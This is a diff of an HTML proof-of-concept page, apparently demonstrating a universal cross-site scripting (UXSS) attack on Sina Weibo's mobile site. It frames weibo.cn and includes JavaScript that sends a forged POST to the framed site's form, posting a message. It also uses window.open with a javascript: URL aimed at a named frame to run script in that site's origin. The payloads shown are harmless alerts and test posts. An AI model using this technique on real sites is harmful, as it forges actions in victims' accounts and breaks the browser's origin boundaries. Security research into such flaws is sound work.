@@ -2,11 +2,11 @@
 <script type="text/javascript">
 function location(){alert('location change!')}
 function cn(){
-var u=document.getElementsByTagName('form')[0].action;var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){alert('uxss')}};xhr.open('POST',u,true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('content=@xavierskip ooxx');
+var u=document.getElementsByTagName('form')[0].action;var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){alert('uxss')}};xhr.open('POST',u,true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('content=@xavierskip 你好');
 }
 </script>
 <iframe src="http://weibo.cn/" name="t"></iframe>
-<a src="http://sina.com" href="http://sina.cn" target="http://sina.cn">fefe</a>
+<a src="http://sina.com" href="http://sina.cn" target="t" name="a">fefe</a>
 <input type=button value="不要碰我！" class="button" 
-onclick=window.open('javascript:alert(location.origin);','http://sina.cn')
+onclick=window.open('javascript:var%20a="%E6%88%91%E9%94%99%E4%BA%86";alert(a);','a')
 >
